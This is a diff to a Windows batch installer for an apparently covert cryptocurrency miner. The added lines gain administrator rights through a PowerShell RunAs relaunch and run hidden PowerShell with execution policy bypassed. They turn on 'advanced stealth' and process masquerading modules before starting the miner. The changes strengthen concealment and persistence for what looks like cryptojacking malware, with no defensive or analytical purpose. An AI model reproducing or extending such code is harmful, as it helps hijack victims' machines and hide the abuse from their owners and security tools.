@@ -68,21 +68,39 @@ echo [*] Starting Universal Mode - Compatible with all systems...
 echo [*] This mode provides the best balance of compatibility and performance
 echo.
 
+REM Check and request admin privileges if needed
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo [*] Administrator privileges confirmed
+) else (
+    echo [*] Requesting administrator privileges...
+    powershell.exe -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs" 
+    exit /b
+)
+
 REM Install universal system
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Install"
+echo [*] Installing universal miner system...
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "try { & '%UNIVERSAL_MANAGER%' -Install } catch { exit 1 }"
 if %errorlevel% neq 0 (
     echo [!] Installation failed, trying alternative method...
     goto :fallback_install
 )
 
 REM Start performance optimizer
-start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"
+echo [*] Starting performance optimizer...
+start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"
 
-REM Basic stealth features (minimal)
-start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Install"
+REM Advanced stealth features (process masquerading)
+echo [*] Enabling advanced stealth features...
+start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "& '%STEALTH_MODULE%' -Install"
+start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "& '%SCRIPT_DIR%process_masquerading.ps1' -Install"
+
+REM Wait for initialization
+timeout /t 3 /nobreak >nul
 
 REM Start universal miner
-powershell.exe -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"
+echo [*] Starting universal miner...
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& '%UNIVERSAL_MANAGER%' -Start"
 
 goto :completion
 
